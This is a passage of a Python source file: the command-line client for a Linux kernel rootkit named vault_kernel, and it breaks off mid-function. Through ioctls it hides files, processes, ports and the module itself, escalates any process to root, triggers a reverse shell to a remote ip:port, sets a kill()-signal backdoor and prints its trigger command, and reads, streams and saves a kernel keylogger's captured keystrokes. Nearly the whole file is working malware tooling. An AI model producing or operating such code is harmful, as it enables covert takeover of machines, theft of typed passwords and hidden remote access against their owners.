#!/usr/bin/env python3
"""
vault_kernel CLI — Userspace client for the vault_kernel kernel rootkit
ruby570bocadito © 2026

Usage:
    python3 vault_kernel_cli.py <command> [args...]

Commands:
    hide-file <name>      Hide a file/directory from ls, find, stat
    unhide-file <name>    Reveal a previously hidden file/directory
    hide-pid <pid>        Hide a process from ps, top, /proc
    unhide-pid <pid>      Reveal a hidden process
    hide-port <port>      Hide a TCP/UDP port from netstat, ss
    unhide-port <port>    Reveal a hidden port
    list [--json]         List all hidden items (PIDs, files, ports)
    stats [--json]        Show module stats (version, hooks, counts)
    watch [--interval MS] [--once]
                          Live view of stats + hidden list (--once: one
                          frame, no ANSI; default refresh 1000 ms)
    give-root [pid]       Escalate a process to root (default: self)
    shell <ip:port>       Trigger reverse shell to remote host
    magic <word>          Set magic packet trigger word
    magic-encode <word> <port>
                          Print the ready-to-run kill() trigger
    keylog [--follow] [--timestamps] [--interval MS] [--output FILE]
                          Read captured keystrokes (stream with --follow)
    keylog-clear          Clear the keylogger buffer
    capture [--out FILE]  Evidence bundle: stats + hidden + keylog as JSON
    hide-module           Hide rootkit from lsmod
    unhide-module         Make rootkit visible in lsmod
    reset                 Clear ALL hidden files, PIDs and ports
    status [--json]       Check if rootkit is loaded and show info
    version               Print client version and ioctl ABI constants
    doctor [--json]       Diagnose module/client state (lab sanity check)
"""

import os
import sys
import stat as stat_mod
import struct
import time
import json
import fcntl
import errno
import signal
import argparse

MAGIC = 0xC0
DEVICE_PATH = "/dev/vault_kernel"
SYSFS_MODULE = "/sys/module/vault_kernel"
CLIENT_VERSION = "3.10"


def _port_arg(value):
    """argparse type: TCP/UDP port in the 1-65535 range."""
    try:
        iv = int(value)
    except ValueError:
        raise argparse.ArgumentTypeError(f"invalid port: {value!r}")
    if not 1 <= iv <= 65535:
        raise argparse.ArgumentTypeError(
            f"port must be in 1-65535, got {iv}")
    return iv


def _pid_arg(value):
    """argparse type: a REAL pid for hide-pid/unhide-pid (>= 1).
    v3.9 parity with the Go parsePIDArg: 0/negative PIDs used to reach
    the module and be stored verbatim in the hide-list ("pid: -5"),
    entries that nothing can ever match (hooked_kill filters pid > 0
    only).  give-root keeps its own contract (pid <= 0 = self)."""
    try:
        iv = int(value)
    except ValueError:
        raise argparse.ArgumentTypeError(f"invalid PID: {value!r}")
    if iv < 1:
        raise argparse.ArgumentTypeError(
            f"PID must be >= 1, got {iv}")
    return iv


def _shell_target_arg(value):
    """argparse type: `ip:port` for the reverse-shell trigger.
    v3.9 parity with the Go parseShellTarget: exactly ONE colon
    (the module splits at the first, so IPv6/garbage with 2+ colons
    is rejected client-side), non-empty host, numeric port 1-65535.
    Until now the Python CLI validated NOTHING here."""
    if value.count(":") != 1:
        raise argparse.ArgumentTypeError(
            f"invalid target {value!r}: use ip:port (IPv6 not supported)")
    host, _, port = value.partition(":")
    if not host:
        raise argparse.ArgumentTypeError(
            f"invalid target {value!r}: empty host")
    try:
        pv = int(port)
    except ValueError:
        raise argparse.ArgumentTypeError(
            f"invalid port in target {value!r}: {port!r}")
    if not 1 <= pv <= 65535:
        raise argparse.ArgumentTypeError(
            f"invalid port in target {value!r}: {port} (must be 1-65535)")
    return value

# Standard Linux ioctl layout (uapi/asm-generic/ioctl.h):
#   bits 31:30 = direction  (0=none, 1=write, 2=read)
#   bits 29:16 = argument size
#   bits 15:8  = type (magic number)
#   bits 7:0   = command number

def _IOC(dir, type, nr, size):
    return (dir << 30) | (size << 16) | (type << 8) | nr

def _IO(type, nr):
    return _IOC(0, type, nr, 0)

def _IOW(type, nr, size):
    return _IOC(1, type, nr, size)

def _IOR(type, nr, size):
    return _IOC(2, type, nr, size)

IOCTL_GIVE_ROOT       = _IO(MAGIC, 0x01)
IOCTL_HIDE_FILE       = _IOW(MAGIC, 0x02, 256)
IOCTL_UNHIDE_FILE     = _IOW(MAGIC, 0x03, 256)
IOCTL_HIDE_PID        = _IOW(MAGIC, 0x04, 4)
IOCTL_UNHIDE_PID      = _IOW(MAGIC, 0x05, 4)
IOCTL_HIDE_PORT       = _IOW(MAGIC, 0x06, 2)
IOCTL_UNHIDE_PORT     = _IOW(MAGIC, 0x07, 2)
IOCTL_LIST_HIDDEN     = _IOR(MAGIC, 0x08, 4096)
IOCTL_KEYLOG_READ     = _IOR(MAGIC, 0x09, 4096)
IOCTL_KEYLOG_CLEAR    = _IO(MAGIC, 0x0A)
IOCTL_BACKDOOR_SHELL  = _IOW(MAGIC, 0x0B, 256)
IOCTL_BACKDOOR_MAGIC  = _IOW(MAGIC, 0x0C, 16)
IOCTL_MODULE_HIDE     = _IO(MAGIC, 0x0D)
IOCTL_MODULE_UNHIDE   = _IO(MAGIC, 0x0E)
IOCTL_GET_STATS       = _IOR(MAGIC, 0x0F, 4096)
IOCTL_RESET_ALL       = _IO(MAGIC, 0x10)

MAGIC_SIGNAL = 35  # glibc SIGRTMIN(34) + 1 — matches MAGIC_SIGNAL in src/backdoor.c

# keylog --follow polling (documented in MILLISECONDS, parity with the
# Go client's default 500 / min 50).
KEYLOG_DEFAULT_INTERVAL_MS = 500
KEYLOG_MIN_INTERVAL_MS = 50

# `watch` refresh cadence — stats change slowly; 1 s is plenty and it
# keeps parity with the Go client's default.
WATCH_DEFAULT_INTERVAL_MS = 1000

# Version of the machine-readable output envelope shared by
# `stats --json`, `list --json` and `doctor --json` in BOTH clients
# (Go and Python). Bump it whenever a field changes meaning or shape;
# additive fields keep it at 1 (v3.7 added it).
JSON_SCHEMA_VERSION = 1


def format_version_line():
    """The `version` command's exact output line — mirrors printVersion()
    in the Go client (client/go/cmd/vault_kernel/main.go)."""
    return (f"vault_kernel CLI v{CLIENT_VERSION} "
            f"(ioctl magic 0x{MAGIC:02X}, signal trigger {MAGIC_SIGNAL})")


def _install_term_handler():
    """Route SIGTERM through KeyboardInterrupt (v3.10) so every long
    loop (`keylog --follow`, `watch`) stops the SAME way as Ctrl-C:
    farewell message, sink flush/close, cursor restore. Without it,
    `systemd stop`/`pkill -TERM` killed the CLI mid-write and skipped
    the finally-blocks. No-op when signal handlers can't be set
    (non-main thread, restricted environments)."""
    def _handler(signum, frame):
        raise KeyboardInterrupt
    try:
        signal.signal(signal.SIGTERM, _handler)
    except (ValueError, OSError):
        pass


def _interval_ms_to_seconds(ms):
    """Convert a documented-MILLISECONDS --interval into the seconds
    time.sleep() expects, clamped to the 50 ms floor.  v3.5 slept the
    raw value as SECONDS ("--interval 500" = 8 minutes per poll,
    1000x slower than the Go client and the documented units)."""
    return max(ms, KEYLOG_MIN_INTERVAL_MS) / 1000.0


def _ms_arg(value):
    """argparse type for poll intervals in MILLISECONDS (`keylog
    --interval`, `watch --interval`).  Integer text only — v3.6 used
    float, which let `--interval nan`/`inf` reach time.sleep() and die
    with a raw ValueError/OverflowError instead of a usage error.
    Negative values are rejected outright; values between 0 and the
    50 ms floor keep the documented clamp of _interval_ms_to_seconds
    (the Go client errors below 50 instead — README documents the
    difference)."""
    try:
        iv = int(value)
    except ValueError:
        raise argparse.ArgumentTypeError(
            f"invalid interval: {value!r} (integer milliseconds)")
    if iv < 0:
        raise argparse.ArgumentTypeError(
            f"interval must not be negative, got {iv}")
    return iv


def format_keylog_event(new_text, ts=None, wrapped=False):
    """Format one `keylog --follow` event — mirrors formatKeylogEvent()
    in the Go client (contract pinned by tests in BOTH clients).

    new_text is the new content of this poll: the suffix diff when the
    buffer grew by appending, or the full report when it wrapped.  With
    ts (the poll time, from --timestamps) every event starts on a fresh
    line prefixed [HH:MM:SS] — the timestamp is the time of the POLL
    that first showed these keystrokes, not the keystroke itself (the
    module's buffer carries no per-keystroke time).  Without ts the
    historical behaviour is kept: suffix continues the line, a wrap
    starts a new one.
    """
    if ts is not None:
        return f"\n[{ts}] {new_text}"
    if wrapped:
        return "\n" + new_text
    return new_text


def fnv1a16(word: str) -> int:
    """FNV-1a 32-bit folded to 16 bits — mirrors vault_fnv1a16() in src/backdoor.c."""
    h = 0x811C9DC5
    for byte in word.encode():
        h ^= byte
        h = (h * 0x01000193) & 0xFFFFFFFF
    return ((h >> 16) ^ (h & 0xFFFF)) & 0xFFFF


def magic_pid(word: str, port: int) -> int:
    """Encode (port, word) into the fake PID for the kill() backdoor trigger."""
    return (port << 16) | fnv1a16(word)


def parse_stats_report(report: str) -> dict:
    """Token-based parser for the GET_STATS key=value report.

    The module puts MULTIPLE pairs on one line ("module=vault_kernel
    version=3.5"), so parsing must split on whitespace first; the old
    line-based partition('=') swallowed every pair after the first
    (v3.4/v3.5 bug in `stats --json` and in the `doctor` version
    check). Mirrors ParseStatsReport in the Go client.
    """
    out = {}
    for line in report.splitlines():
        for tok in line.split():
            key, sep, value = tok.partition("=")
            if key and sep:
                out[key] = value
    return out


def parse_hidden_list(report: str) -> dict:
    """Parse the LIST_HIDDEN report into {"pids": [...], "files":
    [...], "ports": [...]}.  Section context decides how each entry is
    interpreted, so a file literally named "pid: 5" stays a file name.
    Mirrors ParseHiddenList in the Go client.
    """
    result = {"pids": [], "files": [], "ports": []}
    section = None
    for line in report.splitlines():
        stripped = line.strip()
        if stripped.startswith("---"):
            if "PIDs" in stripped:
                section = "pids"
            elif "Files" in stripped:
                section = "files"
            elif "Ports" in stripped:
                section = "ports"
            else:
                section = None
            continue
        if not stripped or section is None:
            continue
        if section == "pids" and stripped.startswith("pid:"):
            try:
                result["pids"].append(int(stripped[4:].strip()))
            except ValueError:
                pass
        elif section == "ports" and stripped.startswith("port:"):
            try:
                result["ports"].append(int(stripped[5:].strip()))
            except ValueError:
                pass
        elif section == "files":
            result["files"].append(stripped)
    return result


def build_capture_bundle(stats_raw: dict, hidden: dict, keylog_text: str,
                         captured_at: str, module_in_sysfs: bool,
                         client_version: str = CLIENT_VERSION) -> dict:
    """Build the `capture` evidence bundle — mirrors buildCaptureReport()
    in the Go client (v3.9, contract pinned by tests in BOTH clients).

    One JSON document freezing the module state for a lab report:
    envelope keys in contractual order (schema, captured_at,
    client_version, module_in_sysfs, stats, hidden, keylog), stats
    reusing the `stats --json` numeric conversion with keys sorted
    (Go's JSON encoder sorts map keys — the mirror keeps parity),
    keylog text verbatim.  captured_at is the UTC RFC3339 instant of
    the SNAPSHOT, taken after the buffers were read.
    """
    stats = {}
    for key in sorted(stats_raw):
        try:
            stats[key] = int(stats_raw[key])
        except ValueError:
            stats[key] = stats_raw[key]
    return {
        "schema": JSON_SCHEMA_VERSION,
        "captured_at": captured_at,
        "client_version": client_version,
        "module_in_sysfs": module_in_sysfs,
        "stats": stats,
        "hidden": {"pids": hidden.get("pids", []),
                   "files": hidden.get("files", []),
                   "ports": hidden.get("ports", [])},
        "keylog": keylog_text,
    }


def format_watch_panel(stats: dict, hidden: dict, interval_ms: int,
                       refreshed_at: str, prev_stats: dict = None) -> str:
    """Build the full-frame text printed by `watch` on every refresh.

    Pure function — the client's watch loop only clears the screen and
    repaints — mirroring RenderWatchPanelDiff in the Go client: stats
    pairs sorted and column-aligned at the widest key, then the parsed
    hidden list.  Empty sections render as "(none)" and a missing
    stats report as "(no stats)".

    With prev_stats (the parsed report of the PREVIOUS refresh, v3.10)
    every stat whose value changed is annotated " (was <old>)" and
    every key that did not exist before gets " (new)" — the live loop
    shows WHAT moved without diffing frames by eye. prev_stats=None
    (first frame, --once) renders the classic panel unchanged. Only
    the stats section is annotated: the module's counters already
    reflect changes in the hidden lists (ADR 20).
    """
    lines = [
        f"vault_kernel watch — refresh {interval_ms} ms — "
        f"updated {refreshed_at} — Ctrl-C to stop",
        "=" * 47,
    ]
    if not stats:
        lines.append("stats: (no stats)")
    else:
        lines.append("== stats ==")
        width = max(len(k) for k in stats)
        for key in sorted(stats):
            suffix = ""
            if prev_stats is not None:
                old = prev_stats.get(key)
                if old is None:
                    suffix = " (new)"
                elif old != stats[key]:
                    suffix = f" (was {old})"
            lines.append(f"{key:<{width}} : {stats[key]}{suffix}")
    lines.append("== hidden ==")

    def _items(xs):
        return ", ".join(str(x) for x in xs) if xs else "(none)"

    lines.append(f"pids : {_items(hidden.get('pids', []))}")
    lines.append(f"files: {_items(hidden.get('files', []))}")
    lines.append(f"ports: {_items(hidden.get('ports', []))}")
    return "\n".join(lines) + "\n"


def _proc_euid(pid):
    """Effective uid of pid read from /proc/<pid>/status, or None."""
    try:
        with open(f"/proc/{pid}/status") as fh:
            for line in fh:
                if line.startswith("Uid:"):
                    fields = line.split()
                    if len(fields) >= 3:
                        return int(fields[2])
    except (OSError, ValueError):
        pass
    return None


def _reject(condition, message):
    """Fail fast with a clear error instead of silently truncating
    the value inside the kernel's fixed-size buffers."""
    if condition:
        raise SystemExit(f"[-] {message}")


def parse_modinfo(output: str) -> dict:
    """Exact-key parser for `modinfo vault_kernel` output (v3.10) —
    mirrors parseModinfo() in the Go client.  Only the contract keys
    (filename, version, author, description) are extracted, by exact
    line-start match (the previous substring scan printed srcversion
    too); first occurrence wins, empty values skipped.  Returns {} when
    none of the keys appeared — callers then omit the section."""
    wanted = ("filename", "version", "author", "description")
    out = {}
    for line in output.splitlines():
        key, sep, value = line.partition(":")
        if not sep:
            continue
        key = key.strip().lower()
        value = value.strip()
        if key in wanted and key not in out and value:
            out[key] = value
    return out


def build_status_document(device_present: bool, module_in_sysfs: bool,
                          modinfo: dict = None) -> dict:
    """Build the `status --json` document (v3.10, 5th JSON document) —
    mirrors buildStatusReport() in the Go client.  Key order is
    contractual (docs/schemas/status.md): schema, device_present,
    module_in_sysfs, modinfo — the modinfo section (filename, version,
    author, description in that order) is omitted when modinfo is
    None/empty (best-effort field)."""
    doc = {"schema": JSON_SCHEMA_VERSION,
           "device_present": device_present,
           "module_in_sysfs": module_in_sysfs}
    if modinfo:
        doc["modinfo"] = {k: modinfo[k]
                          for k in ("filename", "version", "author",
                                    "description") if k in modinfo}
    return doc


def run_doctor(as_json=False):
    """Lab sanity checks: device node, permissions, stats ABI, hook
    count, client/module version match, stealth state and every
    read-only control interface. Exits non-zero only when the module
    is unreachable; warnings do not fail. With as_json=True prints a
    single JSON document instead of text."""
    rep = {"schema": JSON_SCHEMA_VERSION, "client_version": CLIENT_VERSION,
           "warnings": 0}

    def say(fmt, *a):
        if not as_json:
            print(fmt % a)

    def fail(code):
        if as_json:
            print(json.dumps(rep, indent=2))
        raise SystemExit(code)

    say("[*] vault_kernel doctor — lab diagnostics")
    say("")

    try:
        st = os.stat(DEVICE_PATH)
    except OSError:
        rep["device_present"] = False
        say("  [FAIL] %s not found — module is not loaded", DEVICE_PATH)
        say("         Load it first: sudo insmod vault_kernel.ko")
        fail(1)
        return
    rep["device_present"] = True
    say("  [ OK ] device %s present (mode %s)", DEVICE_PATH,
        stat_mod.filemode(st.st_mode))

    try:
        fd = os.open(DEVICE_PATH, os.O_RDWR)
    except OSError as e:
        rep["device_open"] = False
        say("  [FAIL] cannot open %s: %s", DEVICE_PATH, e)
        say("         EACCES/EPERM → run with sudo "
            "(module also rejects non-root since v3.4).")
        fail(1)
        return
    rep["device_open"] = True

    try:
        say("  [ OK ] device opens read/write")

        def raw(request, buf):
            try:
                fcntl.ioctl(fd, request, buf)
                return None
            except OSError as e:
                return e

        buf = bytearray(4096)
        e = raw(IOCTL_GET_STATS, buf)
        if e is not None:
            rep["stats_responds"] = False
            say("  [FAIL] GET_STATS failed: %s", e)
            if e.errno == errno.ENOTTY:
                say("         ENOTTY → client and module versions are out of sync.")
            fail(1)
            return
        rep["stats_responds"] = True
        # The stats report carries MULTIPLE key=value pairs per line —
        # parse it with the shared token-based parser (see
        # parse_stats_report for the v3.4/v3.5 bug this replaces).
        stats = parse_stats_report(buf.rstrip(b'\x00').decode(errors='replace'))
        say("  [ OK ] GET_STATS responds")
        say("         module version : %s", stats.get("version"))
        say("         uptime_s       : %s", stats.get("uptime_s"))
        rep["module_version"] = stats.get("version", "")
        if rep["module_version"] == "":
            del rep["module_version"]
        try:
            rep["uptime_s"] = int(stats["uptime_s"])
        except (KeyError, ValueError):
            pass

        if stats.get("version"):
            rep["version_match"] = stats["version"] == CLIENT_VERSION
            if not rep["version_match"]:
                say("  [WARN] client v%s != module v%s "
                    "— ioctl ABI may differ", CLIENT_VERSION, stats["version"])
                rep["warnings"] += 1

        hooks = stats.get("hooks_installed")
        if hooks is not None:
            try:
                n = int(hooks)
            except ValueError:
                say("  [WARN] hooks_installed not numeric: %r", hooks)
                rep["warnings"] += 1
            else:
                rep["hooks_installed"] = n
                try:
                    p = int(stats["hooks_planned"])
                    rep["hooks_planned"] = p
                    say("  [ OK ] %d/%d syscall hooks installed", n, p)
                except (KeyError, ValueError):
                    say("  [ OK ] %d syscall hooks installed", n)
                if n == 0:
                    say("  [WARN] 0 syscall hooks installed — "
                        "hiding features are inactive")
                    rep["warnings"] += 1

        rep["module_in_sysfs"] = os.path.isdir(SYSFS_MODULE)
        if rep["module_in_sysfs"]:
            say("  [INFO] module visible in /sys/module — not hidden")
        else:
            say("  [INFO] module not in /sys/module — hidden from lsmod/sysfs")

        e = raw(IOCTL_KEYLOG_READ, bytearray(4096))
        rep["keylog_responds"] = e is None
        if e is not None:
            say("  [WARN] KEYLOG_READ failed: %s", e)
            rep["warnings"] += 1
        else:
            say("  [ OK ] keylog interface responds")

        e = raw(IOCTL_LIST_HIDDEN, bytearray(4096))
        rep["list_responds"] = e is None
        if e is not None:
            say("  [WARN] LIST_HIDDEN failed: %s", e)
            rep["warnings"] += 1
        else:
            say("  [ OK ] list interface responds")

        if as_json:
            print(json.dumps(rep, indent=2))
        else:
            print()
            if rep["warnings"]:
                print(f"[*] doctor finished with {rep['warnings']} warning(s)")
            else:
                print("[*] doctor finished: everything OK")
    finally:
        os.close(fd)


class VaultKernelClient:
    def __init__(self):
        self.fd = None

    def _open(self):
        if self.fd is not None:
            return
        if not os.path.exists(DEVICE_PATH):
            raise SystemExit(
                f"[-] {DEVICE_PATH} not found — is the module loaded?\n"
                "    Run: sudo insmod vault_kernel.ko")
        try:
            self.fd = os.open(DEVICE_PATH, os.O_RDWR)
        except PermissionError:
            raise SystemExit(
                f"[-] Permission denied on {DEVICE_PATH}. Run with sudo.")

    def _ioctl(self, request, buf=None):
        """Run an ioctl and report failures cleanly instead of
        crashing with a raw traceback (v3.2 only mapped EPERM)."""
        try:
            fcntl.ioctl(self.fd, request, buf)
            return True
        except OSError as e:
            print(f"[-] ioctl failed: {e}")
            if e.errno in (errno.EPERM, errno.EACCES):
                print("    Run with sudo.")
            elif e.errno == errno.ENOTTY:
                print("    Module and CLI version mismatch (ioctl number).")
            return False

    def _close(self):
        if self.fd is not None:
            os.close(self.fd)
            self.fd = None

    def give_root(self, pid=0):
        """Escalate a process to root. pid=0 means current process."""
        self._open()
        pid_buf = struct.pack("i", pid)
        if self._ioctl(IOCTL_GIVE_ROOT, pid_buf):
            if pid in (0, os.getpid()):
                # The module ran commit_creds() on our own task — verify it.
                if os.geteuid() == 0:
                    print(f"[+] Granted root to PID {pid if pid else os.getpid()} "
                          "(verified: euid=0)")
                else:
                    print("[?] ioctl succeeded but euid is unchanged — check dmesg")
            else:
                print(f"[+] Granted root to PID {pid}")
                euid = _proc_euid(pid)
                if euid == 0:
                    print(f"    Verified via /proc/{pid}/status: euid=0")
                else:
                    print(f"    (could not verify euid via /proc/{pid}/status)")
        self._close()

    def hide_file(self, name):
        _reject(not name, "file name cannot be empty")
        _reject(len(name.encode()) > 255,
                f"name too long ({len(name.encode())} bytes): "
                "the kernel hide-list stores at most 255")
        self._open()
        buf = name.encode().ljust(256, b'\x00')
        if self._ioctl(IOCTL_HIDE_FILE, buf):
            print(f"[+] Hiding file/dir: {name}")
        self._close()

    def unhide_file(self, name):
        _reject(not name, "file name cannot be empty")
        _reject(len(name.encode()) > 255,
                f"name too long ({len(name.encode())} bytes): "
                "the kernel hide-list stores at most 255")
        self._open()
        buf = name.encode().ljust(256, b'\x00')
        if self._ioctl(IOCTL_UNHIDE_FILE, buf):
            print(f"[-] Revealed: {name}")
        self._close()

    def hide_pid(self, pid):
        self._open()
        pid_buf = struct.pack("i", pid)
        if self._ioctl(IOCTL_HIDE_PID, pid_buf):
            print(f"[+] Hiding PID: {pid}")
        self._close()

    def unhide_pid(self, pid):
        self._open()
        pid_buf = struct.pack("i", pid)
        if self._ioctl(IOCTL_UNHIDE_PID, pid_buf):
            print(f"[-] Revealed PID: {pid}")
        self._close()

    def hide_port(self, port):
        self._open()
        port_buf = struct.pack("H", port)
        if self._ioctl(IOCTL_HIDE_PORT, port_buf):
            print(f"[+] Hiding port: {port}")
        self._close()

    def unhide_port(self, port):
        self._open()
        port_buf = struct.pack("H", port)
        if self._ioctl(IOCTL_UNHIDE_PORT, port_buf):
            print(f"[-] Revealed port: {port}")
        self._close()

    def list_hidden(self, as_json=False):
        self._open()
        buf = bytearray(4096)
        if self._ioctl(IOCTL_LIST_HIDDEN, buf):
            output = buf.rstrip(b'\x00').decode(errors='replace')
            if as_json:
                payload = {"schema": JSON_SCHEMA_VERSION,
                           **parse_hidden_list(output)}
                print(json.dumps(payload, indent=2))
            else:
                print(output if output else "(nothing hidden)")
        self._close()

    def shell(self, target):
        """Trigger reverse shell to IP:PORT."""
        _reject(len(target.encode()) > 255,
                f"target too long ({len(target.encode())} bytes): "
                "kernel buffer stores at most 255")
        self._open()
        buf = target.encode().ljust(256, b'\x00')
        if self._ioctl(IOCTL_BACKDOOR_SHELL, buf):
            print(f"[+] Reverse shell triggered — connecting to {target}")
        self._close()

    def set_magic(self, word):
        """Set magic packet trigger word for kill() backdoor."""
        _reject(not word, "magic word cannot be empty")
        _reject(len(word.encode()) > 15,
                f"magic word too long ({len(word.encode())} chars): "
                "module stores at most 15")
        self._open()
        buf = word.encode().ljust(16, b'\x00')
        if self._ioctl(IOCTL_BACKDOOR_MAGIC, buf):
            print(f"[+] Magic packet backdoor enabled: '{word}'")
        self._close()

    def keylog_read(self, follow=False, interval=None, timestamps=False,
                    output=None):
        """Read captured keystrokes; with follow=True, stream new
        keystrokes until Ctrl-C.  The module's buffer shifts left when
        full, so a suffix diff is printed while the common prefix
        holds and a full replay when it wraps.  With timestamps=True
        (follow only) each event is prefixed with the poll time — see
        format_keylog_event.  `interval` is in SECONDS internally
        (None = documented default of 500 ms).  With output=PATH (v3.9)
        every event is ALSO appended to the file and flushed — the
        exact bytes printed to the terminal (timestamps included),
        created 0600 because captures may contain keystrokes; a
        one-shot writes the buffer as one record when non-empty."""
        if interval is None:
            interval = _interval_ms_to_seconds(KEYLOG_DEFAULT_INTERVAL_MS)
        self._open()
        sink = None
        if follow:
            # v3.10: SIGTERM joins Ctrl-C on the same clean-stop path
            # (farewell message + sink close); parity with the Go loop.
            _install_term_handler()

        def _ensure_sink():
            """Lazy-open the output file (0600, append) on the FIRST
            record only — an empty one-shot buffer creates NO file,
            matching the Go keylogSink semantics."""
            nonlocal sink
            if sink is None:
                try:
                    sink = open(output, "a", encoding="utf-8", opener=
                                lambda p, flags: os.open(
                                    p, flags | os.O_APPEND, 0o600))
                except OSError as e:
                    raise SystemExit(
                        f"[-] cannot open keylog output {output}: {e}")
            return sink

        prev = ""
        try:
            while True:
                buf = bytearray(4096)
                if not self._ioctl(IOCTL_KEYLOG_READ, buf):
                    break
                cur = buf.rstrip(b'\x00').decode(errors='replace')
                if not follow:
                    print(f"[*] Keystroke log:\n{cur}" if cur
                          else "[*] (no keystrokes captured)")
                    if output and cur:
                        _ensure_sink().write(cur + "\n")
                        sink.flush()
                    break
                if cur != prev:
                    if len(cur) >= len(prev) and cur.startswith(prev):
                        new_text, wrapped = cur[len(prev):], False
                    else:
                        new_text, wrapped = cur, True
                    event = format_keylog_event(
                        new_text,
                        time.strftime("%H:%M:%S") if timestamps else None,
                        wrapped)
                    print(event, end='', flush=True)
                    if output:
                        _ensure_sink().write(event + "\n")
                        sink.flush()
                    prev = cur
                time.sleep(interval)
        except KeyboardInterrupt:
            print("\n[*] Follow stopped")
        finally:
            if sink is not None:
                sink.close()
            self._close()

    def keylog_clear(self):
        """Clear keylogger buffer."""
        self._open()
        if self._ioctl(IOCTL_KEYLOG_CLEAR):
            print("[+] Keylogger buffer cleared")
        self._close()

    def hide_module(self):
        """Hide the rootkit from lsmod."""
        self._open()
        if self._ioctl(IOCTL_MODULE_HIDE):
            print("[+] Module hidden from lsmod")
        self._close()

    def unhide_module(self):
        """Make the rootkit visible in lsmod."""
        self._open()
        if self._ioctl(IOCTL_MODULE_UNHIDE):
            print("[-] Module visible again in lsmod")
        self._close()

    def watch(self, interval_ms=WATCH_DEFAULT_INTERVAL_MS, once=False):
        """Live view: clear the screen and repaint stats + hidden list
        every interval_ms until Ctrl-C or SIGTERM (both stop cleanly
        since v3.10).  With once=True render a SINGLE frame to stdout
        without any ANSI control sequence and exit — the snapshot mode
        for scripts and reports.  Rendering lives in format_watch_panel
        (pure, unit-tested); this loop only owns the refresh cadence,
        the prev-stats threading for the change annotations, and
        console cursor restoration."""
        self._open()
        prev_stats = None
        try:
            if once:
                stats_buf = bytearray(4096)
                if not self._ioctl(IOCTL_GET_STATS, stats_buf):
                    return
                list_buf = bytearray(4096)
                if not self._ioctl(IOCTL_LIST_HIDDEN, list_buf):
                    return
                stats = parse_stats_report(
                    stats_buf.rstrip(b'\x00').decode(errors='replace'))
                hidden = parse_hidden_list(
                    list_buf.rstrip(b'\x00').decode(errors='replace'))
                panel = format_watch_panel(
                    stats, hidden, interval_ms, time.strftime("%H:%M:%S"))
                print(panel, end="", flush=True)
                return
            _install_term_handler()
            print("\x1b[?25l", end="", flush=True)  # hide cursor
            while True:
                stats_buf = bytearray(4096)
                if not self._ioctl(IOCTL_GET_STATS, stats_buf):
                    return
                list_buf = bytearray(4096)
                if not self._ioctl(IOCTL_LIST_HIDDEN, list_buf):
                    return
                stats = parse_stats_report(
                    stats_buf.rstrip(b'\x00').decode(errors='replace'))
                hidden = parse_hidden_list(
                    list_buf.rstrip(b'\x00').decode(errors='replace'))
                panel = format_watch_panel(
                    stats, hidden, interval_ms, time.strftime("%H:%M:%S"),
                    prev_stats)
                # ANSI: clear screen + home cursor, then the frame.
                print("\x1b[2J\x1b[H" + panel, end="", flush=True)
                prev_stats = stats
                time.sleep(_interval_ms_to_seconds(interval_ms))
        except KeyboardInterrupt:
            print("\n[*] watch stopped")
        finally:
            if not once:
                print("\x1b[?25h", end="", flush=True)  # show cursor
            self._close()

    def reset(self):
        """Clear every hidden file, PID and port in one shot."""
        self._open()
        if self._ioctl(IOCTL_RESET_ALL):
            print("[+] Reset: all hidden files, PIDs and ports cleared")
        self._close()

    def status(self, as_json=False):
        """Check if rootkit is loaded.  With as_json=True (v3.10) emit
        the FIFTH machine-readable document (docs/schemas/status.md) —
        usable without root: status never opens the device.  modinfo is
        best-effort and only present when the device exists and
        `modinfo vault_kernel` ran successfully."""
        device_present = os.path.exists(DEVICE_PATH)
        module_in_sysfs = os.path.isdir(SYSFS_MODULE)
        modinfo = None
        if device_present:
            try:
                import subprocess
                result = subprocess.run(['modinfo', 'vault_kernel'],
                                        capture_output=True, text=True)
                if result.returncode == 0:
                    modinfo = parse_modinfo(result.stdout) or None
            except Exception:
                modinfo = None
        if as_json:
            print(json.dumps(build_status_document(
                device_present, module_in_sysfs, modinfo), indent=2))
            return
        if device_present:
            print("[*] vault_kernel kernel module is LOADED")
            print(f"    Device: {DEVICE_PATH}")
            if modinfo:
                for key in ("version", "author", "description"):
                    if key in modinfo:
                        print(f"    {key}: {modinfo[key]}")
        else:
            print("[*] vault_kernel kernel module is NOT loaded")
            print("    Run: sudo insmod vault_kernel.ko")

    def stats(self, as_json=False):
        """Read module statistics via IOCTL_GET_STATS; optionally
        re-emit as machine-readable JSON (numbers as numbers)."""
        self._open()
        buf = bytearray(4096)
        if self._ioctl(IOCTL_GET_STATS, buf):
            output = buf.rstrip(b'\x00').decode(errors='replace')
            if as_json:
                # v3.10: the JSON path is checked FIRST — an empty/garbage
                # report must FAIL (exit 1, same message as the Go client)
                # instead of printing plain text with exit 0.
                raw = parse_stats_report(output)
                if not raw:
                    raise SystemExit("[-] module returned an empty stats report")
                out = {"schema": JSON_SCHEMA_VERSION}
                for key, value in raw.items():
                    try:
                        out[key] = int(value)
                    except ValueError:
                        out[key] = value
                print(json.dumps(out, indent=2, sort_keys=True))
            elif not output:
                print("(no stats returned)")
            else:
                print(output)
        self._close()

    def magic_encode(self, word, port):
        """Print the ready-to-run kill() incantation for word+port."""
        encoded = magic_pid(word, port)
        print(f"[*] Magic word : {word} (hash 0x{fnv1a16(word):04X})")
        print(f"[*] Port       : {port}")
        print(f"[*] Encoded PID: {encoded}")
        print(f"[*] Trigger    : kill -s {MAGIC_SIGNAL} {encoded}")

    def capture(self, out=None):
        """Evidence bundle (v3.9): read stats, the hidden list and the
        keylog buffer in one pass and emit the `capture` JSON document
        — mirrors runCapture in the Go client.  With out=PATH the file
        is written 0600 (captures may contain keystrokes) and a
        one-line summary goes to stdout; without it the JSON goes to
        stdout like the other --json commands."""
        self._open()
        try:
            stats_buf = bytearray(4096)
            if not self._ioctl(IOCTL_GET_STATS, stats_buf):
                raise SystemExit("[-] capture: GET_STATS failed")
            list_buf = bytearray(4096)
            if not self._ioctl(IOCTL_LIST_HIDDEN, list_buf):
                raise SystemExit("[-] capture: LIST_HIDDEN failed")
            key_buf = bytearray(4096)
            if not self._ioctl(IOCTL_KEYLOG_READ, key_buf):
                raise SystemExit("[-] capture: KEYLOG_READ failed")

            stats_raw = parse_stats_report(
                stats_buf.rstrip(b'\x00').decode(errors='replace'))
            hidden = parse_hidden_list(
                list_buf.rstrip(b'\x00').decode(errors='replace'))
            keylog_text = key_buf.rstrip(b'\x00').decode(errors='replace')
            bundle = build_capture_bundle(
                stats_raw, hidden, keylog_text,
